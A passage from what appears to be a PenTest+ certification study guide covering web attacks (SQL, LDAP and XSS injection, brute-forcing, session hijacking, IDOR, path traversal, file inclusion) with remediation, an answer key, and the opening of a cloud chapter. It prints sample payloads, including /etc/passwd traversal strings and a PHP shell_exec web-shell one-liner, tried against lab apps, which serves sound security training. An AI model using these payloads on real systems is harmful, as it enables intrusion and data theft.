This injection works by terminating the original query and executing another query, such as selecting all of the records from the mysql.users table. An example would be http://example.com/test.php?id=1;select%20\*%20from%20mysql.users--.

Other practice websites that you can use to sharpen your SQLi skills are

• https://hack.me/t/SQLi

• www.gameofhacks.com/

• https://sqlzoo.net/

• Pentester Lab (https://pentesterlab.com) provides free labs and exercises that you can use to demonstrate your pentesting skills, including SQLi.

Recognizing SQL Injection

SQL injection often involves use of terms specific to the query language. Terms like INSERT, SELECT, JOIN, UNION, WHERE, LIMIT, AND, OR, and error messages mentioning SQL are a dead giveaway. Examples often involve creative use of quotes (single or double). Following is a simple example.

URI after attack:

http://vulnerable-site/shopping?id=10 UNION SELECT 1,null,null--

This might list all of the IDs in the table. Read more about testing for SQL injection in OWASP's Web Security Testing Guide under the section Testing for SQL Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/05-Testing\_for\_SQL\_Injection.

Remediation:

1. Parameterize queries and perform input validation by using an allowlist for characters.

2. Use stored procedures.

3. Escape all user input.

Read more about remediation and mitigation in the OWASP OS Command Injection Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL\_Injection\_Prevention\_Cheat\_Sheet.html.

LDAP Injection

Applications may pass authentication data or queries for data into back-end Lightweight Directory Access Protocol (LDAP) systems. Much as with SQL injection, if you can figure out enough information about the query being used or the data format being sent, you can abuse unsanitized, user-controlled input to modify the LDAP queries. Also like with SQL injection, LDAP injection may be aided by errors or conducted blindly based on application behavior.

The LDAP specification is defined by RFC 4515 (https://tools.ietf.org/html/rfc4515) and basically says that LDAP filters are constructed from key-value pairs in parentheses, chained together in any number. LDAP also recognizes wildcards as \*, logical AND as &, Boolean NOT as !, approximately as ~=, and greater than as \>=. As an example, this query would match all entries using a logical OR (that's the | symbol), where the common name (cn) matches anything starting with Antoine or Blanca, or ending in the string 'inski':

(&(|(cn=Antoine\*)(cn=Blanca\*)(cn=\*inski))

Careful application of logic can use knowledge of the application's behavior to guess the LDAP filter syntax and can use this to bypass authentication or get other information in the directory (such as a list of users or other resources) as examples. Common injections may attempt to truncate an LDAP filter by supplying )(&) after valid input in order to attempt to bypass authentication, or using wildcards in parameters that are passed to the filter to cause an error condition that returns more values than expected.

Recognizing LDAP Injection

LDAP injection often involves an ou (organizational unit), cn (common name), or dc (domain component). Look for the key-value pairs, such as ou=computers or cn=Lindsey, in injected filters using the parentheses and comparison characters LDAP uses.

URI after attack:

http://vulnerable-site/ldapsearch?user= \*)(uid=\*))(|(uid=\*

This lists the contents of the current directory. Read more about LDAP injection in the OWASP Web Security Testing Guide under Testing for LDAP Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/06-Testing\_for\_LDAP\_Injection.

Remediation:

1. Escape all variables using LDAP encoding functions.

2. Use language-specific built-in safe frameworks for interacting with LDAP.

3. Run applications at the lowest possible privilege.

Read more about remediation and mitigation in the OWASP LDAP Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/LDAP\_Injection\_Prevention\_Cheat\_Sheet.html.

Cross-Site Scripting

In most of this chapter, we have discussed attacks that are exploited on the server side. However, the client is just as easily a target when it comes to web-based attacks. The server content (e.g., HTML and JavaScript) could have flaws that could be exploited within the victim's web browser or the browser plugin. The source code is always available, since it's executed on the client side. Chapter 4.12, Client Side Testing, of version 4 of the OWASP Testing Guide covers testing of weaknesses like these. Cross-site scripting (XSS) is one such example. With XSS, attackers can inject client-side scripts or HTML code into other web pages to steal information or bypass authentication. This vulnerability is due to a lack of input inspection on the server side. There are three kinds of XSS vulnerabilities:

• Reflected Injecting code within a single HTTP response. Here's an example of a successful reflected XSS execution:

Example:

index.php?page=\<script\>alert('Reflected XSS')\</script\>

• Stored Injecting code in a log file to steal and redirect a session token, which is later accessed through a web interface by an administrative user:

• DOM-based The Document Object Model (DOM) is passed down to the browser from the application during runtime and is used for structuring content. Unlike stored or reflected XSS attacks that get passed back to the server, the execution happens directly in the user's browser, since not every object is treated as a query by the browser. This can make the detection process even more difficult if the logging only occurs on the client. Given the following example of a DOM object passed to the client's browser:

everything passed after the "#" in the URL will be executed in the web browser:

http://example.com/xss/example9.php#message

Simply passing the URL:

http://example.com/xss/example9.php#\<script\>alert("DOM XSS")\</script\>

to a victim willing to click on the link would allow an alert box to appear, much like a reflected XSS attack.

TIP Some web browsers have built-in content filters to prevent this type of an attack from occurring. NoScript (https://noscript.net) is a browser extension for Mozilla-based browsers that can help block unwanted scripts from executing in your browser and limit execution to only trusted websites.

For more exercises, take a look at the labs at https://portswigger.net/web-security/cross-site-scripting/stored.

Recognizing XSS

Cross-site scripting examples will often (but not always) involve HTML tags, with symbols such as \<, \>, =, and quotes. These may also be URL encoded (for example, %3C, %3E, etc.). It may include references to event handlers like onclick, onload or onmouseover or calls to other JavaScript functions. Use of the \<script\> tag is a giveaway.

A malicious POST request including XSS:

postId=399&content=%3Cscript%3Ealert(%27XSS%27)%3B%203C%2Fscript%3E

Read more about filter evasion in the OWASP XSS Filter Evasion Cheatsheet: https://owasp.org/www-community/xss-filter-evasion-cheatsheet and more about Testing for Stored Cross-Site Scripting in the OWASP WSTG: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/02-Testing\_for\_Stored\_Cross\_Site\_Scripting.

Remediation:

1. Don't insert untrusted data into a page between script tags; in attribute names, tag names, or comments; or directly in style sheets.

2. Do not allow the application to run JavaScript or uniform resource locators (URLs) from untrusted locations.

3. Encode data before inserting untrusted data into script values, page element contents, style property values, or URL parameters.

4. Use libraries that implement an allowlist approach to sanitize input values and avoid the use of unsafe characters such as \<, \>, %, \*, +, -, /, ;, =, |, and +.

Read more about remediation and mitigation in the OWASP Cross-Site Scripting Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross\_Site\_Scripting\_Prevention\_Cheat\_Sheet.html

Cross-Site Request Forgery

Cross-site request forgery (CSRF) is another type of client-side injection attack that causes a user to perform an action they do not intend against a trusted website. The most dangerous form of CSRF is when the user is already authenticated with a valid session. Attack vectors can include vulnerable web pages, blogs, e-mail, etc. These attacks are typically targeted and, when successful, can result in a victim purchasing an item, transferring money, or changing a password. If the victim is an admin or has elevated privileges, the attack could target the ability to create or modify existing accounts within an application. An example would be embedding a hidden image inside of a web post to a news group that points to a malicious request to transfer funds using the "attack" servlet. If this was a real servlet from a banking application and the victims were already logged in to their accounts, $5,000 would be transferred out of their accounts. The message would appear harmless, and the image size could be significantly reduced such that it doesn't call as much attention to itself within the body of the message. Figure 5-1 provides an example of this scenario where a potentially harmless message is submitted to the user group. Figure 5-2 shows an example of what happens when the message is opened.

Figure 5-1 CSRF example scenario message

Figure 5-2 CSRF example scenario message contents

Attacking Authentication and Session Management

In this section, we will take a closer look at three different types of authentication attacks against login forms using usernames, passwords, and authenticated session tokens. We will cover the various tools and methods a pentester can use to exploit these types of vulnerabilities. This will be a web-specific exploration of the topic.

Brute-Force Login Pages

In the web world, authentication forms are used to read and process data from user-supplied input from a web browser. Once the user has entered data in the form fields and clicked the button to submit the data, the browser executes an HTTP POST request with the body of the message to the web application for processing. When you view the HTML source code in your web browser, the HTML form will look something like this:

This form page example processes two input fields from the user: a username and password. During a pentest engagement, you are likely to come across application servers that allow users to authenticate access via username and password. These types of forms are typically the target of brute-force login attacks.

TIP Notice in the HTML source of the example login page that the text field size limit is set to 8, which means it will only process the first eight characters in the input box. Thus, if you were to build a wordlist or password rule to brute-force the login, you only need to define the passwords or rule up to eight characters in length.

The Damn Vulnerable Web Application (DVWA) (http://dvwa.co.uk) is free software and runs as a web application that is susceptible to many common types of web-based attacks. Users can download, install, and modify the application under the terms of the GNU General Public License. We will use the DVWA as a basic example of how to brute-force a login form page. After setting up the DVWA, you can access the login page using the following URL in a web browser: http://\<ipaddress\>/dvwa/login.php. The login page will look similar to Figure 5-3.

Figure 5-3 DVWA login page

Wordlists

CeWL is a Ruby application that spiders a given URL and returns a wordlist. Wordlists can be useful for brute-forcing directory paths or passwords, as with Hydra or John the Ripper. As an example, if we are attacking a web login form whose username and password are unknown, you could use your favorite wordlist, one in /usr/share/wordlists in Kali Linux, or use CeWL against the URL to build a custom wordlist that uses words and phrases scraped from the target web pages. The following is an example of executing CeWL from the command line in Kali Linux, which is also shown in Figure 5-4:

Figure 5-4 CeWL command output

# cewl -v -d 2 -m 5 -w dvwa\_wordlist http://192.168.1.52/dvwa

The following command options are available:

• -v Verbose output

• -d Depth to spider to; the default is 2

• -m Minimum word length

• -w Write the output to the file

Using a Wordlist for Attack

Now, we can use the wordlist with Hydra to brute-force the login page. However, before we can use Hydra, we need to capture the POST request sent to the server for processing, as we need the correct parameters to feed into Hydra so our brute-force requests can be properly formatted. So, fire up your favorite web proxy software to intercept a fake login request to the server. (We used Burp Proxy, but OWASP ZAP, Firefox Developer Tools, Tamper Data, etc., are other tools that can be used to accomplish this task as well.) After enabling the proxy in Burp and configuring the web browser to use a Burp Proxy port, we were able to capture a login request to the server, as shown in Figure 5-5.

Figure 5-5 Burp Proxy login request

As you can see in the body of the POST request, username=, password=, and Login= are the three valid parameters that make up the login request. Now that we have the correct web parameters to provide Hydra, we can execute the following syntax from the command line in Kali Linux:

The example output is shown in Figure 5-6.

Figure 5-6 Hydra command output

The command options are as follows:

• -l User to log in as.

• -P Load several passwords from a file.

• http-post-form Service module to use for the request.

• " " Module options; in this case, we use the URL and POST message body. The ^USER^ and ^PASS^ are populated with user and password command options.

• -V Verbose mode.

Based on the output from Hydra, we were successful with identifying a valid password for the admin user, using 13 possible passwords scraped from the DVWA page. The "password" text was identified when CeWL scraped the "Hint" message at the bottom of the webpage.

Session Management Testing

Web sessions are designed to accompany the user's interaction within the web framework. A unique session identifier is generated by the web server or web application and lasts for the duration of the user's visit. A session ID (or token) can be stored locally on the user's hard drive as a cookie, form field, or URL. Each token is used to validate a user's session and can be used by the application to establish access rights or user settings for each transaction during the session. These may have a time-to-live value, depending on how the web framework is configured. These types of sessions are dynamically generated numbers, which should be difficult to guess. Similar to a hashing function, the token is used to verify the integrity of the user's request. Tokens should use random number generators rather than simply incrementing static numbers. Otherwise, the user's sessions could fall victim to session hijacking or replay attacks.

OWASP provides a Session Management Cheat Sheet on their official website, which describes common weaknesses and best practices when configuring session management for web applications. Burp Suite Pro is a commercial software product that provides web and web application security testing capabilities. Tokens found within HTTP responses can be battle-tested for known security weaknesses, such as weak token attributes, session expirations, and token entropy (or lack thereof), using Burp Sequencer. Once you identify the position of the field where the token is located, you can start the live capture. As shown in Figure 5-7, once you have collected enough samples of data, Sequencer will analyze the data and provide an assessment based on the randomness of the sample at each character position and the probability the same character will be repeated at the same position.

Figure 5-7 Evaluating session randomness with Burp

EXAM TIP Burp Suite Pro is a common tool used for web and web application penetration testing. Many questions on the exam are related to web-based testing. You should have a firm understanding of the OWASP Top Ten 2017 Application Security, as you may see questions that reference these criteria.

Most web frameworks are designed to use session token/cookie authentication. Session-based authentication is stateful, such that the server and client both keep a record of the session. Each time the user makes a request to access data, the session data is submitted in the query and validated by the server. The Set-Cookie header (example: Set-Cookie: sessionID=ksirut8jsl219485a1f459f2siper5) is included in the server response to the client, and the cookie value is stored in the client's browser. Additional attributes can accompany the Set-Cookie response header to inform the client's browser on how to handle the cookie, including:

• HTTPOnly The cookie cannot be accessed via JavaScript, such as cookie theft through XSS attacks.

• Path This defines the URL where the cookie is valid.

• Domain Defines the domain where the cookie is valid (e.g., example.com).

• Expires This tells the browser to save the cookie locally for persistent storage and that it will be used by the browser for future requests until the expiration date. If not set, the cookie is only good for the life of the browser session.

• Secure This is used to ensure the cookie never makes its way over a nonencrypted connection, like HTTP. This helps prevent against credential theft when a malicious user is sniffing the network.

When the client makes a subsequent request to the server, the cookie value will accompany each request. In some cases, the pentester may need to reverse-engineer the cookie to determine how the cookie was generated or protected. Some web frameworks may sign or encode (i.e., base64-encoded value) the cookie to obfuscate it and prevent tampering in transit. In the case where developers use their own session IDs, if randomness and complexity are not adequately applied into the equation, the cookie value can be manipulated to identify a valid session, which means the application could be susceptible to brute-force attacks.

Now let's demonstrate this type of attack to manipulate a cookie value to steal a legitimate session from the server. We will use the OWASP WebGoat-Legacy Project (https://github.com/WebGoat/WebGoat-Legacy) to test against the Session Management Flaws "Hijack a Session" example. The first part of the attack will collect a sufficient sample of cookies to analyze in order to determine the web framework's cookie generation scheme. Then, we will create a valid cookie (cookie manipulation) to conduct the attack.

Once you log in using a random username and password, you are told that you used an "Invalid username or password." However, the application provides you with another cookie called WEAKID, with a value of WEAKID=17280-1531178283601. With a little digging we are able to decipher that the first part of the cookie, 17280, is a sequential number that is incremented by one digit each time we destroy the session and attempt to log back in. The second part of the cookie appears to be a timestamp in milliseconds (per the documentation).

After logging in and out about five times, we know we are not going to be able to guess the number easily. So, we turn to Burp Sequencer, which can help generate enough cookie values to guess an existing session cookie. We intercept a login request to the application, then forward the request to Sequencer. In Sequencer, we make sure to select the Cookie option, as shown in Figure 5-8.

Figure 5-8 Burp Sequencer token location

Then we click the Start Live Capture button. We wait until we have a fairly large sample of tokens before we stop the capture process. Once we have over 2,000 tokens, we click the Stop button to stop the capture process, then click Save Tokens to save the tokens to a file for offline analysis. Then, we use Sequencer and click the Manual Load tab. From here, we load the tokens from the file we just saved using the Load button, as shown in Figure 5-9.

Figure 5-9 Manual load of sample tokens in Sequencer

Starting from the top of the list, we notice immediately that there is a gap in the numbers between 17283 and 17285. Due to this break in sequence, we are pretty sure that there is already a token issued for 17284, which is not a token we have in our list. So, we look in Burp and forward the original login session to Repeater, where we can manipulate the cookie value in order to attempt to hijack the session. After testing our suspicions with the missing token value, we find the session is valid and we are successful in hijacking an existing session, as shown in Figure 5-10, based on the response message from the server. Of course, rather than guessing a session ID, you could also intercept it using some form of on-path attack and replay it, too.

Figure 5-10 Hijacking a session in Burp

Now that you are aware of how session hijacking works, you should be aware of a couple of best practices. First, a session should be invalidated when the user logs out. Second, web applications should assign a new session ID upon authentication. In the first case, you can use session hijacking to take over an authenticated session after the user has logged out (as long as the session has not yet expired). In the second case, you can do something called session fixation, which means you can set up the session ID with the application, send a malicious link to a user, and the application will allow that session ID to be used during the user session. If that happens, you effectively gain their authenticated access using the session ID you generated and know.

Data Exposure and Insecure Configuration

I think it comes as no surprise that web application servers that are improperly configured or lack good security hygiene (like patch management) are likely to be the target of attack. As mentioned in Chapter 4, default account passwords from product vendors are typically found in open-source wordlists, like the ones we have been using throughout the book and that are found in /usr/share/wordlists within Kali Linux. At the time of this writing, the CIRT password list (https://cirt.net/passwords) (CIRT are the developers of the infamous Nikto web application scanning tool) listed over 2,080 default passwords used by more than 500 different vendors. These accounts are meant to be used for initial setup and configuration. Most of the time, the vendor will recommend disabling the account or, at a minimum, changing the default password. Apache Tomcat (http://tomcat.apache.org) is a well-known open-source product used for hosting and deploying Java-based web applications.

In earlier releases of the software, the Tomcat Manager servlet (a servlet is a Java program that extends the communication capabilities of a server, such as receiving messages and sending responses, mostly using HTTP) was used to deploy and manage these applications. Tomcat was shipped with the Manager application enabled, along with a well-known default username and password of tomcat/tomcat. These credentials have been used and abused over time to compromise organizational systems; however, to mitigate against this common threat, Apache Tomcat started releasing the default product installation with the Manager application disabled. At least out of the box, the product was a little more secure, and now with the ability to deploy it as a Software as a Service (SaaS) solution, developers and system administrators should have less to worry about with regard to installation weaknesses.

OWASP suggests that attackers will often attempt to exploit unpatched flaws/bugs or access default accounts or unused web pages, unprotected files and directories, etc., in order to obtain unauthorized access or knowledge of a system. Example attack scenarios might be default plugins or accounts/passwords being installed with the application, poor access controls that enable access to files outside of the web root (topmost directory where publicly accessible web files and directories are located), or even applications displaying detailed error messages (e.g., stack traces) that could expose the web component versions that may have known vulnerabilities. In this section, we will cover a few of these attack methods, including path traversals, exposing sensitive data, and weak access controls.

Weak Access Controls

Once a user has logged in and authenticated, the web server (or web application) should be configured to restrict the content a user has access to, based on an access control policy. Access control policies define the requirements for how access to a resource should be managed and controlled based on the rule of least privilege. An example would be an Apache HTTP Server that restricts access to a web directory based on hostname or IP address, as some of the content on the website may not be for public consumption. In the httpd.conf file (Apache HTTP configuration file), the following restriction may be applied to allow private IP addresses to access the restricted folder on the web server, and anyone else is denied:

TIP The Apache HTTP Server uses modules to implement certain functionality within it. Modules are an extension of a server's capability. For instance, the mod\_authz\_host module can be used to control access to directories, files, and locations on the server based on IP address, while the mod\_ftp module can be used to allow users to download or upload files using FTP. Apache includes many modules in its core distribution; however, it supports a lot of other ones that are not installed by default. You can check out a list of supported modules for the Apache HTTP Server at http://httpd.apache.org/modules.

If the web server was missing this level of access control, any user who browsed to a page within the /restricted folder would be able to have access to the content. Another thing to consider with Apache is that directory indexing (or directory browsing) is enabled by default. This functionality is similar to an ls command in Unix or dir command in Windows. With directory browsing enabled and a lack of access controls, an attacker would not have to rely on brute-force methods to derive web pages and/or subdirectories. Figure 5-11 shows an example directory index for the /admin directory.

Figure 5-11 Directory index

To mitigate this, you can add an index.html in the directory you wish to disable directory browsing for (if the HTML file is blank, the attacker would see a blank page), or you can remove the Indexes option from within the Apache HTTP configuration file for the given directory or the entire website. Web access controls for controlling the display of content are just as important as controlling the unnecessary exposure of sensitive objects or information from within web applications.

Exposing Sensitive Data

An application flaw is not always a programming error, but instead a weakness in how the data or information is being protected. Certain types of information, such as passwords, credit card numbers, Social Security numbers, and health and privacy information, require certain levels of protection. As we learned in previous chapters, encryption is a method that can be used to protect the confidentiality of this type of data. However, if the implementation of the protection mechanism is misconfigured or inadequate, an attack against this vulnerability could be catastrophic. OWASP presents three attack scenarios for sensitive data exposure:

• Scenario #1 An application encrypts credit card numbers in a database using automatic database encryption. However, this data is automatically encrypted when retrieved, allowing a SQL injection flaw to retrieve credit card numbers in cleartext.

• Scenario #2 A site doesn't use or enforce Transport Layer Security (TLS) for all pages or it supports weak encryption. An attacker monitors network traffic (e.g., at an insecure wireless network), downgrades connections from HTTPS to HTTP, intercepts requests, and steals the user's session cookie. The attacker then replays this cookie and hijacks the user's (authenticated) session, accessing or modifying the user's private data, or instead the attacker could alter all transported data (e.g., the recipient of a money transfer).

• Scenario #3 The password database uses unsalted or simple hashes to store everyone's passwords. A file upload flaw allows an attacker to retrieve the password database. All the unsalted hashes can be exposed with a rainbow table of precalculated hashes. Hashes generated by simple or fast hash functions may be cracked by graphics processing units (GPUs), even if they were salted.

Sensitive data exposure can also come in the form of an error message or a reference to an internal function that inadvertently reveals the true nature of the request. This is called an insecure direct object reference (IDOR). An example would be exposing a database record (such as a primary key) as a referenced object within a web parameter or URL. IDOR is not a vulnerability by itself; however, if the database or application server lacks proper access control, then an attacker can likely infer the schema or pattern of the object being referenced. For example, if a foreign key value is called directly through a web parameter, a malicious user who already authenticated into the system could modify the parameter to access the contents of another user's profile. To demonstrate, I used the OWASP WebGoat Project web application called Goat Hills Financial Human Resources and logged in as the user Tom to access the profile data for the user Eric. Using Burp Proxy, I intercepted the HTTP GET request for the action ViewProfile to identify the parameters passed in the request, as shown in Figure 5-12.

Figure 5-12 Intercept IDOR parameter

I noticed the parameter employee\_id=105, which looks to be a direct object pointer and unique to the user Tom. Using Burp Repeater, I modified the parameter and replayed the HTTP GET request, but now requesting employee\_id=104 to see if the field was incremental. After submitting the request, I was able to retrieve the profile for Eric, as shown in Figure 5-13.

Figure 5-13 Modify IDOR parameter

If the IDOR parameter had been hidden or obfuscated, it would have made this attack a little harder to be successful or possibly less visible. Regardless, this issue was a direct result of poor access controls and ultimately relies on the web and database server to properly validate these types of requests.

Directory and Path Traversals

Directory and path traversal attacks are a form of injection attack that enables a malicious actor to access content that would not normally be available by using shortcuts to browse outside of the web server's root folder. Using the directory traversal example provided with the Web for Pentester ISO from the Pentester Labs website, we can demonstrate this type of attack. Given the following URL:

http://192.168.1.108/dirtrav/example1.php?file=hacker.png

the file= parameter is used to retrieve the image named hacker.png. If we take a look at the PHP code that makes this possible, we can get an idea of what is going on behind the scenes:

The $UploadDir variable identifies the absolute path on the operating system to be '/var/www/files/', which is where the file hacker.png is located. The $file variable is defined with the $\_GET['file'] method, which parses the filename from the file= parameter. The $path variable declares the full path of where the file should be located on the server. If the $path doesn't exist, the request is null. Then $handle opens the path to the file for reading ('rb'). The do-while loop is used to read the file variable up to a maximum chunk size of 8192 bytes. If the length is 0, the program breaks; if not, the file contents are read and echoed to the web browser. Then the fclose() function is used to close the file prior to exiting the program.

So, now let's test if the parameter is vulnerable to a path traversal. In order to test this, we could use the following /../../../../../etc/passwd in place of hacker.png to access the local operating system passwd file, which is not served normally as a web page. The forward slash and the dots tell the web operation to traverse back several directories in the path, much like the change directory "cd" command in a terminal window. However, in Windows, the slash is a backward slash rather than a forward slash to separate directories in file paths (e.g., \..\..\..\C:\boot.ini). In Windows, the directory separator ("/" or "\") can be either forward or backward. However, in Unix, it can only be a forward slash ("/"). This means that in Windows to bypass or escape a web content filter that only looks for "/" in malicious requests, you can use the other directory separator. As you can see in Figure 5-14, the directory traversal attack against the Unix target was successful.

Figure 5-14 Directory traversal with Burp

TIP There are a number of variations to use when testing path traversal attacks. It's mostly about encoding the directory path or initiating the correct escape sequence to break out of the typical web filter. To bypass trivial content filters that look for special characters, such as the forward slash, an attacker might use Unicode / UTF-8 or even URL encoding, such as the following: %2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd to accomplish the same result.

The reason the path traversal was successful is because there was no program logic to prevent access to files outside of the web root. One way path traversal could be mitigated is to base-name the $file variable in the PHP code. This will return the trailing name component of $file, and any attempt to access files outside of the $UploadDir would fail. An example of how to implement this function in our code would be as follows:

$file = basename($\_GET['file']);

NOTE On the surface, it may be hard to distinguish between a file inclusion vulnerability (LFI and RFI) and a path or directory traversal. The primary difference is that with a traversal attack, you only have the ability to read the contents of a local resource (e.g., /etc/passwd), whereas with file inclusion, the resource can be loaded and executed within the context of the application, which can provide code execution.

Sensitive Data Exposure

Applications that don't use encryption to protect data while it is stored or transmitted, or applications that implement weak encryption or risky encryption practices may also introduce risk to the client. Some compliance-based penetration tests have specific requirements involving the evaluation of encryption use. Examples of risky practices include the use of unsalted hashes, hashes that implement a weak hashing algorithm (such as MD5), or applications that automatically decrypt data when it is retrieved (this allows a SQL injection flaw to expose all data). Transmission of sensitive data over an unencrypted protocol (no TLS enforcement) or with a weak encryption scheme may subject the data to potential exposure in the event of a successful on-path attack over an unsecured wireless network, for example.

During on-path attacks, it may be necessary to set up a proxy service to force Secure Sockets Layer (SSL) stripping from client requests, such that when a client goes to connect to an SSL-enabled website, the certificate will be stripped from the session and the browser window will not display any SSL certificate message. Essentially, the HTTPS website was downgraded to HTTP. Once a user attempts to log in or enter sensitive data into a website when SSL has been stripped, the data will be sent via plaintext and can easily be captured in the session data. To mitigate against this type of an attack, websites can enforce HTTP Strict Transport Security (HSTS) to protect against downgrade attacks like SSL stripping. Organizations can also block port 80/tcp at the firewall or force the website/application to only run on the SSL-enabled port.

Inclusion Attacks

The ability to load arbitrary content within a web page is known as an inclusion attack. Most web application frameworks (e.g., PHP) support file inclusion. File inclusion exploits take advantage of "dynamic file inclusion" capabilities in a web application. In PHP applications, these vulnerabilities typically exploit flaws in code using the following built-in functions: include() and require(). There are two kinds of file inclusions: local (LFI) and remote (RFI).

Local file inclusion includes files outside of the web root and renders the contents of local operating system files to the browser window, such as the password file, example.php?page=../../../../etc/passwd. In some cases LFI could lead to remote code execution. One method for testing remote code execution is by using PHP wrappers. The PHP Expect wrapper allows the execution of system commands: example.php?page=expect://id; however, the Expect wrapper is not enabled by default. Another PHP wrapper is the input stream, which allows you to read raw data from the request body. In the case of an HTTP POST message, you could use the following example to execute commands against the local operating system:

POST /example.php?page=php://input&cmd=id HTTP/1.1

In the body of the message, you could use the following PHP code that will be read and processed through the PHP input stream:

\<?php echo shell\_exec($\_GET['cmd']);?\>

The cmd command would be executed through the shell\_exec() function and in this example return the userid of the user that owns the web server process.

Remote file inclusions allow files or even whole pages to be displayed inside the vulnerable web page. If the parameters within the HTTP request can be altered to point to a malicious location, it's possible the web application is susceptible to RFI, which in turn could allow for malicious code to be run on the server or on the client (i.e., malicious JavaScript to steal cookie data). An example RFI attack might look like the following:

LFI and RFI are both dangerous methods that can be mitigated with the proper use of input validation. Another way of taking advantage of a web application's poor input validation and content control is by performing malicious file uploads. If a web application allows unauthorized users to upload a file and then execute it, attackers may be able to compromise the system. Web servers that support various web scripting languages such as PHP can easily fall victim to backdoor shells. Controlling access to where files are uploaded and controlling supported file types are ways to mitigate against this type of vulnerability. A simple PHP one-liner is sometimes all you need! Figure 5-15 provides an example of executing the Linux id command using a PHP web shell. The code used to develop the web shell is as follows:

Figure 5-15 Malicious file upload

Race Conditions

A race condition occurs when two or more application logic components have co-dependent data, do not have appropriate concurrency protections, and execute simultaneously. As a result, quick execution may retrieve data that has changed between when it is checked and when it is actioned. In short: the application may clobber itself when transactions run concurrently.

An example of a race condition would be when multiple threads access the same data (variables, files, etc.) at the same time without locking the data or synchronizing it. This sort of data integrity issue is pretty important when you're dealing with applications that do things like manage balances or issue vouchers or money-based resources (like gift cards).

Normally, a web server would get a request from a client and serve a page. But more complex web applications add layers. The browser might make a request to the server, and the server might send that to Java Server Pages (JSP), which then compiles it into a servlet, where it is then interpreted and executed to generate the response details. Along the way, applications might use multithreading to scale these sorts of requests across multiple applications, systems, or application components. If each component doesn't handle thread safety properly, it may be possible to attack the application and produce unexpected results. Normally, pentesters would find these issues with insight into the source code, as these are difficult (but not impossible) to identify using something like Burp Intruder. But let's take a minute to think about that use case.

Assume you have an application that can transfer a balance from one card to another, and you can capture the POST request in Burp Intruder. Intruder has an option to raise the threads to something like 25, just to pick a number. The default is 5. This will let you send many simultaneous requests. You wouldn't even necessarily have to change the payload, so you can use a null payload to send the request as-is. Now, if there's a race condition, it's possible that the application will eventually generate an unexpected result. For example, the balance might become negative, as the value from one card is successfully debited and deposited before the previous transaction has been completed.

Chapter Review

Web and database technology plays a significant role within most organizations. A few years ago, just having a website was good enough to contend in competitive markets and allow your customer base to see what it is your company can do. Today, companies are investing additional time and energy into building a presence on social media sites such as Facebook, Twitter, Instagram, and LinkedIn, in order to stay connected with the digital world. In today's world, companies can move parts of their data center into the cloud to cut annual operational costs and achieve even higher levels of system availability. It is imperative that organizations evaluate web and database security within their organization, since the digital age is most definitely upon us. Attacks against web-based technology are not just server-side any longer. More sophisticated attacks are targeting end users, as most client-side exploits are fairly trivial, require little effort, and the attacker has much to gain. As long as the reward outweighs the risk of getting caught, attackers will continue to find new ways to exploit advancements in web-based technology.

Answers

1. B. The INSERT statement is missing a value for the fourth column. Each column identified within the INSERT statement needs to have a field value. If one of the fields is a required field, that field is not allowed to be null, such as an empty value.

2. A. The sys\_eval() and sys\_exec() functions are required to be configured on the database server in order for a user-defined function (UDF) to be created, which can ultimately lead to command execution against the operating system with the privileges of the operating system user that owns the process.

3. B, D.. The "'", "--", and ";" are all definitely ways to help trigger an error response from a database that lacks application or database filtering.

4. C. The -d option is used to specify how deep to traverse into the website, and -m is used to specify the minimum amount of words the tool identifies.

5. D. The best answer is D, as it can help escape a basic forward-slash content filter and potentially show the contents of the boot.ini file.

6. A, D, E, F.. All the answers are correct, with the exception of command injection and directory traversal. Those types of attacks are for server-side vulnerabilities.

7. A. During runtime, the application will pass down the DOM to help structure content within the browser. DOM modules may include JavaScript code that can execute locally within the user's browser.

8. B. The PHP code declares the $data variable by reading 8192 bytes of $handle. Then, if the length of $data is equal to 0, the script either terminates or will continue to echo the contents of $data and complete the loop.

9. A, C.. The "acct=" and "emp\_id=" parameters are somewhat of a dead giveaway, in that they may be linked to another user's information that could be retrieved without the necessary access controls with the web application or database.

CHAPTER 6

Attacking the Cloud

In this chapter, you will learn about

• Performing attacks against cloud technologies, such as credential harvesting, privilege escalation, and account takeover

• Identifying misconfigured cloud assets

• Using cloud-specialized attack tools for cloud attacks

Like network, mobile, and application penetration testing, cloud pentesting is quickly becoming its own unique discipline. The CompTIA PenTest+ exam acknowledges this and may have questions to test your knowledge of the subject area. In this chapter, we will attempt to cover enough of this discipline to aid you during your certification attempt, but we encourage you to do additional research in this area to truly build your expertise.

In Chapter 1 we talked about special environmental considerations applying to cloud penetration testing. Let's take a deeper look at what this means. It's been said that there is no cloud, there is only someone else's computer. This is a humorous but not altogether inaccurate description of Software as a Service (SaaS) models, where the end user does not own the environment being tested. Since the end user can only provide permission to test the content they own, this means traditional pentesting methods can't be used. In Amazon Web Services (AWS), for instance, legal and technological constraints for SaaS environments forbid testing of physical hardware, underlying operating systems, and EC2 environments belonging to other organizations—even if they are leveraged by the target, or Amazon's small Relational Database Service (RDS).

NOTE The rules of engagement for Microsoft Cloud are at https://www.microsoft.com/en-us/msrc/pentest-rules-of-engagement, AWS rules are at https://aws.amazon.com/security/penetration-testing/, and Google Cloud rules are at https://support.google.com/cloud/answer/6262505?hl=en.

As a result, cloud pentesting—for SaaS environments at least—will focus on the evaluation of assets owned by the user. This includes credentials and other authorization keys, user-supplied configurations governing management and permissions, API usage, and other functionality created by the application owner rather than the cloud provider. Misconfiguration can expose data hosted within the cloud environment and allow side-channel attacks, takeovers, and exploitation of assets that exist in or rely upon the environment. Insecurely implemented services may be prone to attacks that allow the target to be vulnerable to—or even used in—denial of service (DoS) attacks. This is a small survey of the possible attack landscape for cloud pentests.

Keep in mind that there are many cloud providers, and each has its own approach to implementing cloud services. These differences in approaches will affect the tooling you use and how you apply the concepts covered in this chapter. In most cases, talking about the cloud means we're talking about three main providers (Amazon, Microsoft, and Google), so we'll stick to these three to cover cloud pentest concepts to prepare you for basic scenario analysis during the CompTIA PenTest+ exam.

